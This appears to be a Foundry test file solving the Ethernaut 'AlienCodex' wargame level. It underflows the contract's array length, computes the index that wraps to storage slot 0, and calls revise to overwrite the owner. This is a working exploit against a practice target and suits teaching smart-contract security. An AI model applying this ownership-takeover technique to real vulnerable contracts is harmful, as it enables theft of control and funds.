// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import { IAlienCodex } from "src/19_AlienCodex/IAlienCodex.sol";

contract AlienCodexTest is Test {

    IAlienCodex alienCodex;
    address instanceAddress = 0xbcA93F74EE0805e44c75961F802013F3ddDf0F33;


    function setUp() public {
        alienCodex = IAlienCodex(instanceAddress);
    }

    function testAlienCodexInitialState() public {
        assertFalse(alienCodex.contact());
    }

    function testAlienCodexInitialOwner() public {
        assert(alienCodex.owner() !=  address(0));
    }


    function _calculateArrayIndex(uint256 _index) public view returns (uint256) {
        uint storageIndex = 1;
        bytes memory storageIndexBytes = abi.encodePacked(storageIndex);
        bytes32 arrayStorageLocationBytes = keccak256(storageIndexBytes);
        uint256 arrayStorageLocationUint = uint256(arrayStorageLocationBytes);
        uint256 arrayIndex = type(uint256).max - arrayStorageLocationUint + _index + 1;
        return arrayIndex;
    }

    function testAlienCodexArrayAccessAfterRetract() public {
        alienCodex.make_contact();
        alienCodex.retract();

        uint256 offsetToZeroLocation = _calculateArrayIndex(0);
        address owner = alienCodex.owner();
        emit log_named_address("owner", owner);

        bytes32 responseBytes = alienCodex.codex(offsetToZeroLocation);
        emit log_named_bytes32("responseBytes", responseBytes);

        address derivedOwner = address(uint160(uint256(responseBytes)));
        emit log_named_address("derivedOwner", derivedOwner);

        assertEq(owner, derivedOwner);

    }

    function testAlienCodexSetOwner() public {
        alienCodex.make_contact();
        alienCodex.retract();

        uint256 offsetToZeroLocation = _calculateArrayIndex(0);
        address newOwner = address(this);
        uint96 contactUint;
        if(alienCodex.contact()) {
            contactUint = 1;
        } else {
            contactUint = 0;
        }
        bytes memory encodedData = abi.encodePacked(contactUint, newOwner);
        emit log_named_bytes("encodedData", encodedData);
        bytes32 encodedDataBytes32 = bytes32(encodedData);
        emit log_named_bytes32("encodedDataBytes32", encodedDataBytes32);

        alienCodex.revise(offsetToZeroLocation, encodedDataBytes32);

        assertEq(alienCodex.owner(), newOwner);
    }
}
